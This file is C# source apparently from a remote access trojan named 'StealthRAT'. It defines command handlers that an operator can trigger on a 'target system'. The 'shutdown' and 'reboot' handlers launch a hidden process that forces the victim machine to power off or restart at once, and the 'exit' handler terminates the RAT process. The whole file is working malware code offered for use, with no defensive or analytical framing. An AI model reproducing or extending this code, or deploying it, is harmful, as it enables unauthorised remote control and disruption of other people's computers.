using System.Diagnostics;
using StealthRAT.Interfaces;

namespace StealthRAT.Handlers;

/// <summary>
/// Handles the "shutdown" command to power off the target system.
/// Initiates an immediate forced shutdown using the Windows shutdown utility.
/// </summary>
public sealed class ShutdownHandler : ICommandHandler
{
    /// <inheritdoc/>
    public string CommandName => "shutdown";

    /// <inheritdoc/>
    public Task<string> ExecuteAsync(string[] args, CommandContext context)
    {
        try
        {
            var startInfo = new ProcessStartInfo
            {
                FileName = "shutdown",
                Arguments = "/s /t 0 /f",
                UseShellExecute = false,
                CreateNoWindow = true
            };
            Process.Start(startInfo);
            return Task.FromResult("OK: System shutdown initiated");
        }
        catch (Exception ex)
        {
            return Task.FromResult($"ERR: Failed to initiate shutdown - {ex.Message}");
        }
    }
}

/// <summary>
/// Handles the "reboot" command to restart the target system.
/// Initiates an immediate forced reboot using the Windows shutdown utility.
/// </summary>
public sealed class RebootHandler : ICommandHandler
{
    /// <inheritdoc/>
    public string CommandName => "reboot";

    /// <inheritdoc/>
    public Task<string> ExecuteAsync(string[] args, CommandContext context)
    {
        try
        {
            var startInfo = new ProcessStartInfo
            {
                FileName = "shutdown",
                Arguments = "/r /t 0 /f",
                UseShellExecute = false,
                CreateNoWindow = true
            };
            Process.Start(startInfo);
            return Task.FromResult("OK: System reboot initiated");
        }
        catch (Exception ex)
        {
            return Task.FromResult($"ERR: Failed to initiate reboot - {ex.Message}");
        }
    }
}

/// <summary>
/// Handles the "exit" command to terminate the RAT process itself.
/// Performs a graceful exit with a short delay to allow the response to be sent.
/// </summary>
public sealed class ExitHandler : ICommandHandler
{
    /// <inheritdoc/>
    public string CommandName => "exit";

    /// <inheritdoc/>
    public Task<string> ExecuteAsync(string[] args, CommandContext context)
    {
        // Schedule exit on a background thread to allow response to be sent first
        _ = Task.Run(async () =>
        {
            await Task.Delay(500); // Allow response to reach the client
            Environment.Exit(0);
        });

        return Task.FromResult("OK: Exiting application");
    }
}
